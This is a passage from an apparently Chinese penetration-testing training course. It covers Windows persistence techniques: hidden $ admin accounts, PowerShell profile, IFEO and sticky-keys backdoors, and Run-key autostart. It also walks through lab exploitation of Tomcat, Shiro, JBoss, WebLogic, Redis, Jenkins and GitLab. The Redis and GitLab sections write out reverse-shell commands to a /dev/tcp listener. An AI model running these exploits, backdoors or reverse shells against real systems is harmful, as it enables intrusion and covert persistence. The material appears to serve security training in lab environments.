title=\"Rootkit\"></a>Rootkit</h4><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并 可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件 检测：使用相关检测工具，比如：unhide</p>\n<p><a href=\"https://blog.csdn.net/qq_53742230/article/details/125917148\">https://blog.csdn.net/qq_53742230&#x2F;article&#x2F;details&#x2F;125917148</a></p>\n<h3 id=\"windows权限维持\"><a href=\"#windows权限维持\" class=\"headerlink\" title=\"windows权限维持\"></a>windows权限维持</h3><h4 id=\"影子账户\"><a href=\"#影子账户\" class=\"headerlink\" title=\"影子账户\"></a>影子账户</h4><p>通常在拿到服务器后会创建一个带$符号的账户，因为在常规cmd下是无法查看到的。</p>\n<p>影子账户，顾名思义就是隐藏的账户，在“控制面板-用户账户”里面是看不见，但却有管理员权限的账户</p>\n<p>复现:</p>\n<p>第一步：创建一个带$符号的账户</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user garck$ abc123qq.. /add </span><br></pre></td></tr></table></figure>\n<p><img src=\"e5iYLJF8LedmScEbvYnN5S2jB7RblL5Gb_EJSRAUqMc.png\" alt=\"image\"></p>\n<p>第二步：打开注册表 </p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">regedit</span><br><span class=\"line\">HEKY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users</span><br><span class=\"line\"><span class=\"comment\">//看不见的时候，是权限不够，需要给自己添加权限</span></span><br></pre></td></tr></table></figure>\n<p>garck$对应的是0x3ea，管理员对应的是0x1f4</p>\n<p><img src=\"NepAaZXSFMbM3C0J7EX8HT8_JwxVdO0NIjL3WXRjApw.png\" alt=\"image\"></p>\n<p>将管理员对应的F项的值，复制粘贴到garck$用户的对应F项的值。</p>\n<p><img src=\"Gy5MQX-p2p7UVqqEO2TZM4-nGiwDkgOyYAghCjZwuyU.png\" alt=\"image\"></p>\n<p><img src=\"u2-sqHWb3qKOAZ2tUoi5b5z0YrHfYDlxKOCKmlsHPaY.png\" alt=\"image\"></p>\n<p>第三步：导出用户及对应的项的注册表文件,分别命名为1.reg和2.reg，删除掉用户。</p>\n<p><img src=\"qYMpYH5OwCMDw2G4hMrta-p4uaysSzLGyhRgNQp6sxY.png\" alt=\"image\"></p>\n<p><img src=\"omC3WhIKndrpI5TdgNog114wh4W3vIKj1I_r8xJv8l0.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user garck$ /del</span><br></pre></td></tr></table></figure>\n<p>第四步：重新导入，分别双击reg文件即可。</p>\n<p><img src=\"93fMCptqk5yiGNIO5bx-dA-cv_jF1G2pKElM-SutqlI.png\" alt=\"image\"></p>\n<p>查看控制面板没发现用户</p>\n<p><img src=\"2AZj9K5TJhrARAHnkhnzGWj5TXRj1GsQGTksbAHOZSg.png\" alt=\"image\"></p>\n<p>第五步：登陆目标服务器，利用影子账号。</p>\n<p>首先，管理账户中并没有garck$账户</p>\n<p>远程登陆</p>\n<p><img src=\"EpQErN3imfpJlEvWZHjDJffpV4OgEis2X3bWF2RygNo.png\" alt=\"image\"></p>\n<h4 id=\"powershell配置文件后门\"><a href=\"#powershell配置文件后门\" class=\"headerlink\" title=\"powershell配置文件后门\"></a>powershell配置文件后门</h4><p>简介</p>\n<p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。</p>\n<p>Powershell配置文件其实就是一个powershell脚本，他可以在每次运行powershell的时候自动运行，所以可以通过向该文件写入自定义的语句用来长期维持权限。</p>\n<p>复现</p>\n<p>第一步：准备1.bat脚本，内容为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user garck1 abc123QQ… /add &amp; net localgroup administrators garck1 /add</span><br></pre></td></tr></table></figure>\n<p>第二步：打开Windows PowerShell ，输入以下命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo $profile # 查看当前是否存在配置文件。</span><br><span class=\"line\">Test-path $profile # 如果返回Flase 则可以进行配置</span><br><span class=\"line\">New-Item -Path $profile -Type File –Force # 创建配置文件</span><br><span class=\"line\">$string = ‘Start-Process “C:\\<span class=\"number\">1.</span>bat”’</span><br><span class=\"line\">$string | Out-File -FilePath $profile -Append</span><br><span class=\"line\">more $profile # 查看文件</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">echo $profile</span><br><span class=\"line\">Test-path $profile</span><br><span class=\"line\">New-Item -Path $profile -Type File –<span class=\"type\">Force</span></span><br><span class=\"line\"><span class=\"variable\">$string</span> <span class=\"operator\">=</span> ‘Start-Process “C:\\<span class=\"number\">1.</span>bat”’</span><br><span class=\"line\">$string | Out-File -FilePath $profile -Append</span><br><span class=\"line\">more $profile</span><br></pre></td></tr></table></figure>\n<p><img src=\"Wcku3532Ss7qXyQUqFEz-kHxP_R0MULW_UoZ0is0iRM.png\" alt=\"image\"></p>\n<p>第三步：重新打开powershell就会自动执行</p>\n<p><img src=\"8M41j3V5XSwr40ovzvear_JT7k-452YrHimQ9opVDgY.png\" alt=\"image\"></p>\n<h4 id=\"映像劫持技术\"><a href=\"#映像劫持技术\" class=\"headerlink\" title=\"映像劫持技术\"></a>映像劫持技术</h4><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。</p>\n<p>当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。</p>\n<p>出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</p>\n<p>简单点说，当你打开的是程序A，而运行的却是程序B。</p>\n<p>实战：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">regedit</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Image File Execution Options</span><br><span class=\"line\"><span class=\"comment\">//添加</span></span><br><span class=\"line\">REG ADD <span class=\"string\">&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class=\"string\">&quot;C:\\windows\\system32\\cmd.exe&quot;</span></span><br><span class=\"line\"><span class=\"comment\">//删除</span></span><br><span class=\"line\">REG delete <span class=\"string\">&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot;</span> /v Debugger</span><br></pre></td></tr></table></figure>\n<p><img src=\"AvJwrLmkoqYwi594pWrhDH1rYQev8Bz9UEM0w3i9Wec.png\" alt=\"image\"></p>\n<p>添加成功之后，按五次shift键可以唤起cmd，删除之后就恢复原样了</p>\n<h4 id=\"shift后门\"><a href=\"#shift后门\" class=\"headerlink\" title=\"shift后门\"></a>shift后门</h4><p>辅助功能提供了其他选项（屏幕键盘、放大镜、屏幕阅读），可以帮助人更轻松地使用Windows操作系统，但是此功能可能会被滥用，以在已启用RDP且已获得管理员级别权限的主机上实现持久性。</p>\n<p>第一步：将sethc.exe拥有者改为administrator</p>\n<p><img src=\"-gB5hno1fy-eChGCZFOqvpU-jNdP1uwLns_nLicLbLI.png\" alt=\"image\"></p>\n<p>第二步：输入命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">move C:\\windows\\system32\\sethc.exe C:\\windows\\system32\\sethc1.exe</span><br><span class=\"line\">Copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"sd_NodwUT3H-n-usikCOaPvTv_YL-mATkQF31vpQHOI.png\" alt=\"image\"></p>\n<p>第三步：连续按5次shift</p>\n<p><img src=\"H-cgUqNM1Tr0VDCKvolc4Pph_PNBAEJKGLWxh-dFSdI.png\" alt=\"image\"></p>\n<p>远程连接之后</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">explorer</span><br></pre></td></tr></table></figure>\n<p>除了shift之外，还有以下这些也可以尝试</p>\n<p><img src=\"hGhcs_JFKhMC5SAGrYRqZdzh30Oxu6GlIqfdaDMXaRI.png\" alt=\"image\"></p>\n<p>恢复：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Copy C:\\windows\\system32\\sethc1.exe C:\\windows\\system32\\sethc.exe</span><br></pre></td></tr></table></figure>\n\n\n<h4 id=\"注册表自启动\"><a href=\"#注册表自启动\" class=\"headerlink\" title=\"注册表自启动\"></a>注册表自启动</h4><p>简介</p>\n<p>注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。</p>\n<p>这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。</p>\n<p>复现</p>\n<p>第一步：输入命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">regedit</span><br><span class=\"line\">reg add <span class=\"string\">&quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span> /v test2 /t REG_SZ /d <span class=\"string\">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span> /f</span><br><span class=\"line\">reg delete <span class=\"string\">&quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span> /v test2</span><br></pre></td></tr></table></figure>\n<p>第二步：重启服务器，自动会打开notepad.exe</p>\n<p><img src=\"8yJtvCaZ67iaLC-6QEmClZEEptViSQ0EWiqixhgLsmc.png\" alt=\"image\"></p>\n","categories":["原创培训课件"],"tags":["权限提升","权限维持"]},{"title":"day5-内网渗透基础二（上午：中间件、域渗透）","url":"/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%BA%8C%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%AD%E9%97%B4%E4%BB%B6%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F%EF%BC%89/","content":"<h1 id=\"day5-内网渗透基础二（上午：中间件、域渗透）\"><a href=\"#day5-内网渗透基础二（上午：中间件、域渗透）\" class=\"headerlink\" title=\"day5-内网渗透基础二（上午：中间件、域渗透）\"></a>day5-内网渗透基础二（上午：中间件、域渗透）</h1><h2 id=\"常见漏洞详解\"><a href=\"#常见漏洞详解\" class=\"headerlink\" title=\"常见漏洞详解\"></a>常见漏洞详解</h2><p><a href=\"https://vulfocus.cn/\">https://vulfocus.cn/</a></p>\n<h3 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h3><h4 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a>Tomcat</h4><p>名称: vulfocus&#x2F;tomcat-pass-getshell:latest</p>\n<p>攻击思路：通过弱口令登录后台，部署war包geshell</p>\n<p>1.发现tomcat默认页面</p>\n<p><img src=\"kjvFaGxiqrUoPRrpErQ2_TYjmF4A6NrjD1ywOmgfZYE.png\" alt=\"image\"></p>\n<p>2.弱口令tomcat&#x2F;tomcat成功登录后台</p>\n<p><img src=\"Z2GjX3IgHTmkjeF39VTugziHIzb729JWHRh7PVyIZXA.png\" alt=\"image\"></p>\n<p>3.可以在下图红方框内下面的上传处进行war文件上传，上传后会自动解压</p>\n<p><img src=\"QwmkH1aiJC6yIms3DRQfYqsy2T-MlYxk1aOIng-Uix8.png\" alt=\"image\"></p>\n<p>4.制作war包</p>\n<p>jar -cvf dm.war dm.jsp</p>\n<p>5.上传war包成功</p>\n<p><img src=\"AepTgoMiiXdeD968qfVa-r742tjLfqFo-xj0JCTemwI.png\" alt=\"image\"></p>\n<p>访问webshell</p>\n<p><a href=\"http://123.58.224.8:15622/dama/dama.jsp\">http://123.58.224.8:15622/dama/dama.jsp</a></p>\n<p>找到了flage</p>\n<p><img src=\"yWM_c_gZP-U0PymBk7Z5GhbmppHXsjRRUauY1fr0mig.png\" alt=\"image\"></p>\n<h4 id=\"Shiro-CVE-2016-4437\"><a href=\"#Shiro-CVE-2016-4437\" class=\"headerlink\" title=\"Shiro(CVE-2016-4437)\"></a>Shiro(CVE-2016-4437)</h4><p>介绍：</p>\n<p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>\n<p>漏洞原因：</p>\n<p>Apache Shiro默认使用了CookieRememberMeManager。其处理cookie的流程是：</p>\n<p>得到rememberMe的cookie值；Base64解码；AES解密；反序列化。</p>\n<p>然而AES的密钥是硬编码的，即AES加解密的密钥是写死在代码中的，攻击者可以构造恶意数据造成反序列化漏洞。</p>\n<p>影响版本：Apache Shiro &lt;&#x3D; 1.2.4</p>\n<p>实战：</p>\n<p>使用工具：shiro_attack-1.5</p>\n<p>1.打开burp抓包</p>\n<p>burp抓包-repeater发包-看回显-响应头存在rememberMe字段-存在shiro框架</p>\n<p><img src=\"bxKp3dI43YrCnxDEdR-m1GS6xQIgrjhd6ovIBq9M0eA.png\" alt=\"image\"></p>\n<p><img src=\"2O82mX0iEBBTH7d5r-ueAjORdq1BX_m5LQv3tTEmCNE.png\" alt=\"image\"></p>\n<p>2.使用工具探测，是否存在shrio的漏洞，并且猜解加密key</p>\n<p><img src=\"i0HWRrmZYA2w2rSc1HkyH4k8qiez5lNSaw5rh5Sl79A.png\" alt=\"image\"></p>\n<p>3.得到了加密key为默认的：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>\n<p>4.更改利用链2，尝试攻击</p>\n<p><img src=\"6mSr-XaQk2IthQwbvGkTn_KuY8r27YKgkKovf2mLobU.png\" alt=\"image\"></p>\n<p><img src=\"UsBfzPan5g0lqWt3h8z6YDjtPT4ni48dwTQxwer9-vM.png\" alt=\"image\"></p>\n<h4 id=\"jboos反序列化漏洞-CVE-2017-12149\"><a href=\"#jboos反序列化漏洞-CVE-2017-12149\" class=\"headerlink\" title=\"jboos反序列化漏洞(CVE-2017-12149)\"></a>jboos反序列化漏洞(CVE-2017-12149)</h4><p>vulfocus&#x2F;jboss-cve_2017_12149:latest</p>\n<p>介绍：</p>\n<p>JBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。</p>\n<p>影响版本：5.x和6.x版本</p>\n<p>漏洞原因：该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。</p>\n<p>实战：</p>\n<p>1.打开网址</p>\n<p><img src=\"PcmQXk11-AugukkT4l4eDADoxGkiL5cebsXWsgxi2i8.png\" alt=\"image\"></p>\n<p>2。攻击机访问<a href=\"http://123.58.224.8:28913/invoker/readonly,%E8%8B%A5%E6%98%BE%E7%A4%BAHTTP\">http://123.58.224.8:28913/invoker/readonly,若显示HTTP</a> Status 500,则说明存在漏洞。</p>\n<p><img src=\"n100OGIYFSNzMNNR-B5Q6qCwPp_88Pb-aHvFnmT_GWY.png\" alt=\"image\"></p>\n<p>3.使用工具 jboss-_CVE-2017-12149  <a href=\"https://github.com/yunxu1/jboss-/_CVE-2017-12149\">https://github.com/yunxu1/jboss-\\_CVE-2017-12149</a></p>\n<p><img src=\"iFPtHzS9rLXwm5zX283MLPZm4t29Aw-ff-CEtcwVZjA.png\" alt=\"image\"></p>\n<p>4.执行命令</p>\n<p><img src=\"0iOxLVMFhRkzFtQOOEYFwlQwVdz1YIUED1ncplnNBSs.png\" alt=\"image\"></p>\n<p>5.查找flag</p>\n<p><img src=\"SuQweTn3NiQ9jEe3C2zXH6g2UkSCvRjY-DNWbWfVZEE.png\" alt=\"image\"></p>\n<h4 id=\"weblogic-远程代码执行-CVE-2019-2729\"><a href=\"#weblogic-远程代码执行-CVE-2019-2729\" class=\"headerlink\" title=\"weblogic 远程代码执行 (CVE-2019-2729)\"></a>weblogic 远程代码执行 (CVE-2019-2729)</h4><p>vulfocus&#x2F;weblogic-cve_2018_3245:latest     7001</p>\n<p>介绍：</p>\n<p>Oracle WebLogic Server是美国<a href=\"https://so.csdn.net/so/search?q=%E7%94%B2%E9%AA%A8%E6%96%87&spm=1001.2101.3001.7020\">甲骨文</a>（Oracle）公司的一款适用于云环境和传统环境的应用服务中间件，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。</p>\n<p>漏洞描述：</p>\n<p>CVE-2019-2729漏洞是对CVE-2019-2725漏洞补丁进行绕过，形成新的漏洞利用方式，属于CVE-2019-2725漏洞的变形绕过。与CVE-2019-2725漏洞相似，CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意HTTP请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。</p>\n<p>该漏洞本质是由于 wls9-async组件在反序列化处理输入信息时存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，获取服务器权限，实现远程命令执行。</p>\n<p>漏洞url为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">url:port/_async/AsyncResponseService</span><br></pre></td></tr></table></figure>\n<p>1.访问下边的url地址 可以访问 可能存在漏洞</p>\n<p><img src=\"Aq0hQZPT2J_adJpCFK2kg_stCsE6pH5bylennWh38Oo.png\" alt=\"image\"></p>\n<p>2.漏洞利用地址<br>&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>\n<p>3.直接使用工具：oracle-weblogic-deserialize.py</p>\n<p><img src=\"IuUoQurB-e3k0384_7ydoWsud0ux1u2ud36qOWpfzZw.png\" alt=\"image\"></p>\n<p>whoami</p>\n<p><img src=\"lfRY2cxEWTDDtbv9TPZtn6Eo3lXjaN7VNfV0tXf2qO8.png\" alt=\"image\"></p>\n<p>查看flag</p>\n<p><img src=\"uyNynI7uBP4UUd25QvE33LZ9F1PNmqbZLWA4XozMY50.png\" alt=\"image\"></p>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><h4 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h4><p>用宿主机</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -p <span class=\"number\">5379</span>:<span class=\"number\">6379</span> -d --name redis vulfocus/redis-cnvd_2015_07557</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h5 id=\"介绍：\"><a href=\"#介绍：\" class=\"headerlink\" title=\"介绍：\"></a>介绍：</h5><p>Redis是一套开源的使用ANSI C编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的API。</p>\n<h5 id=\"漏洞原因：\"><a href=\"#漏洞原因：\" class=\"headerlink\" title=\"漏洞原因：\"></a>漏洞原因：</h5><p>Redis默认情况下会绑定在0.0.0.0:6379，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功将自己的公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。</p>\n<h5 id=\"基本命令介绍：\"><a href=\"#基本命令介绍：\" class=\"headerlink\" title=\"基本命令介绍：\"></a>基本命令介绍：</h5><p>连接redis：<code>redis-cli -h 192.168.63.130</code></p>\n<p>查看redis版本信息、一些具体信息、服务器版本信息等等：<code>192.168.63.130:6379&gt;info</code></p>\n<p>将变量x的值设为test：<code>192.168.63.130:6379&gt;set x &quot;test&quot;</code></p>\n<p>获取设置的某个变量的值：<code>192.168.63.130:6379&gt;get x</code></p>\n<p>`flushall`是把整个redis数据库删除，一般情况下不要用！！！<code>192.168.63.130:6379&gt;flushall</code></p>\n<p>查看所有键：<code>192.168.63.130:6379&gt;KEYS *</code></p>\n<p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>\n<p><code>192.168.63.130:6379&gt;CONFIG GET dir</code></p>\n<p><code>192.168.63.130:6379&gt;CONFIG GET dbfilename</code></p>\n<h5 id=\"一般攻击思路：\"><a href=\"#一般攻击思路：\" class=\"headerlink\" title=\"一般攻击思路：\"></a>一般攻击思路：</h5><p>1.写webshell</p>\n<p>2.写公钥</p>\n<p>3.写定时任务反弹shell</p>\n<h5 id=\"实战：\"><a href=\"#实战：\" class=\"headerlink\" title=\"实战：\"></a>实战：</h5><p>1.写入语句到变量x (每一分钟执行一次)</p>\n<p><code>echo -e &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.88.133/7799 0&gt;&amp;1\\n\\n&quot;|redis-cli -h 192.168.88.104 -p 5379 -x set 1</code></p>\n<p>2.#设置Redis的备份路径</p>\n<p><code>redis-cli -h 192.168.88.104 -p 5379 config set dir /var/spool/cron/  </code></p>\n<p>3.#设置备份文件和文件名</p>\n<p><code>redis-cli -h 192.168.88.104 -p 5379 config set dbfilename root</code></p>\n<p><code>redis-cli -h 192.168.88.104 -p 5379 save</code></p>\n<ol start=\"4\">\n<li></li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo -e <span class=\"string\">&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.88.133/7799 0&gt;&amp;1\\n\\n&quot;</span>|redis-cli -h <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span> -p <span class=\"number\">6379</span> -x set <span class=\"number\">1</span></span><br><span class=\"line\">redis-cli -h <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span> -p <span class=\"number\">6379</span> config set dir /<span class=\"keyword\">var</span>/spool/cron/  </span><br><span class=\"line\">redis-cli -h <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span> -p <span class=\"number\">6379</span> config set dbfilename root</span><br><span class=\"line\">redis-cli -h <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span> -p <span class=\"number\">6379</span> save</span><br></pre></td></tr></table></figure>\n<p><img src=\"G80hCVyM51JY3vOX4zlC1IXr5cMyrwg7H8V9e8heoy4.png\" alt=\"image\"></p>\n<p>4.Kali监听</p>\n<p><code>nc -lvnp 7799</code></p>\n<p><img src=\"-ixOoYJHnQQxFgj1FZdN32ZsVcst668WNsw20OI_Gd4.png\" alt=\"image\"></p>\n<p>redis环境搭建</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"comment\">//download.redis.io/releases/redis-5.0.10.tar.gz  //下载</span></span><br><span class=\"line\">tar -zxf redis-<span class=\"number\">5.0</span><span class=\"number\">.10</span>.tar.gz <span class=\"comment\">//解压</span></span><br><span class=\"line\">cd redis-<span class=\"number\">5.0</span><span class=\"number\">.10</span>/</span><br><span class=\"line\">make</span><br><span class=\"line\">使用vim命令打开redis.conf</span><br><span class=\"line\">requirepass 密码</span><br><span class=\"line\">允许远程访问，找到bind <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> -::<span class=\"number\">1</span>,修改为bind <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span></span><br><span class=\"line\">redis-server redis.conf  <span class=\"comment\">//启动</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"vH-KpUHSpBBuD4vCMD-TDpkO18_hsFseabGVfJmeM-8.png\" alt=\"image\"></p>\n<h3 id=\"运维软件\"><a href=\"#运维软件\" class=\"headerlink\" title=\"运维软件\"></a>运维软件</h3><h4 id=\"Jenkins\"><a href=\"#Jenkins\" class=\"headerlink\" title=\"Jenkins\"></a>Jenkins</h4><p>docker pull vulfocus&#x2F;jenkins-cve_2017_1000353</p>\n<p>docker run -p 8877:8080 -d –name jenkins vulfocus&#x2F;jenkins-cve_2017_1000353</p>\n<p><a href=\"http://192.168.88.104:8877/\">http://192.168.88.104:8877/</a></p>\n<p>介绍：</p>\n<p>Jenkins 可以通过其网页界面轻松设置和配置,其中包括即时错误检查和内置帮助。 插件 通过更新中心中的 1000 多个插件,Jenkins 集成了持续集成和持续交付工具链中几乎所有的工具。</p>\n<p>漏洞原因：</p>\n<p>漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露。</p>\n<p>影响范围：</p>\n<p>所有Jenkins主版本均受到影响(包括&lt;&#x3D;2.56版本)所有Jenkins LTS 均受到影响( 包括&lt;&#x3D;2.46.1版本)</p>\n<p>实战：</p>\n<p>1.访问网页</p>\n<p><img src=\"Ra7NDPeMHACNvG02-ccbCxHbPZ1utAhmmbe8BVE9h9g.png\" alt=\"image\"></p>\n<p>2.生成序列化字符串 jenkins_poc.ser</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//生成序列化字符串</span></span><br><span class=\"line\">java -jar jenkins-CVE-<span class=\"number\">2017</span>-<span class=\"number\">1000353</span>-<span class=\"number\">1.1</span>-SNAPSHOT-all.jar jenkins_poc.ser <span class=\"string\">&quot;touch /tmp/success&quot;</span></span><br><span class=\"line\"><span class=\"comment\">//发送数据包，执行命令</span></span><br><span class=\"line\">python3 exploit.py http:<span class=\"comment\">//192.168.88.104:8877 jenkins_poc.ser</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"gz-bqunStJ0u8PdNGo2GqgMy4P3Ya74TS1exjPuY2f4.png\" alt=\"image\"></p>\n<p><img src=\"0PV3fEj-hdXZE-_OgcmCKYNOjJ16xxZSNFPUpciUZiY.png\" alt=\"image\"></p>\n<p>3.复现成功</p>\n<p>docker exec -it a48 &#x2F;bin&#x2F;bash</p>\n<p><img src=\"FyKbaZEhd8LtHJhMzn-g08ex7aSrNlZfk4TOtUYFMoE.png\" alt=\"image\"></p>\n<p>4.关闭容器</p>\n<p>docker stop jenkins</p>\n<p>5.重启开启关闭的容器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br><span class=\"line\">docker start 容器ID</span><br></pre></td></tr></table></figure>\n<h4 id=\"gitlab\"><a href=\"#gitlab\" class=\"headerlink\" title=\"gitlab\"></a>gitlab</h4><p>介绍：</p>\n<p>GitLab是一款Ruby开发的Git项目管理平台</p>\n<p>漏洞描述：</p>\n<p>在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href=\"https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html\" title=\"CVE-2021-22204\">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。</p>\n<p>影响版本：</p>\n<p>11.9 &lt;&#x3D; Gitlab CE&#x2F;EE &lt; 13.8.8；13.9 &lt;&#x3D; Gitlab CE&#x2F;EE &lt; 13.9.6；13.10 &lt;&#x3D; Gitlab CE&#x2F;EE &lt; 13.10.3</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull vulfocus/gitlab-cve_2021_22205</span><br><span class=\"line\">docker run -p <span class=\"number\">8056</span>:<span class=\"number\">80</span> -p <span class=\"number\">8443</span>:<span class=\"number\">443</span> -p <span class=\"number\">8057</span>:<span class=\"number\">8080</span> -d --name gitlab vulfocus/gitlab-cve_2021_22205</span><br><span class=\"line\">docker run -p <span class=\"number\">8056</span>:<span class=\"number\">80</span>  -d --name gitlab vulfocus/gitlab-cve_2021_22205</span><br><span class=\"line\">访问http:<span class=\"comment\">//192.168.88.104:8056 出现502需要再等一会儿</span></span><br><span class=\"line\">python37 CVE-<span class=\"number\">2021</span>-<span class=\"number\">22205.</span>py -v <span class=\"literal\">true</span> -t http:<span class=\"comment\">//192.168.88.104:8056</span></span><br><span class=\"line\">python37 CVE-<span class=\"number\">2021</span>-<span class=\"number\">22205.</span>py -a <span class=\"literal\">true</span> -t http:<span class=\"comment\">//192.168.88.104:8056 -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.133/7799 0&gt;&amp;1&#x27; &gt;/tmp/garck.sh&quot;</span></span><br><span class=\"line\">python37 CVE-<span class=\"number\">2021</span>-<span class=\"number\">22205.</span>py -a <span class=\"literal\">true</span> -t http:<span class=\"comment\">//192.168.88.104:8056 -c &quot;chmod +x /tmp/garck.sh&quot;</span></span><br><span class=\"line\">python37 CVE-<span class=\"number\">2021</span>-<span class=\"number\">22205.</span>py -a <span class=\"literal\">true</span> -t http:<span class=\"comment\">//192.168.88.104:8056 -c &quot;/bin/bash /tmp/garck.sh&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p><img 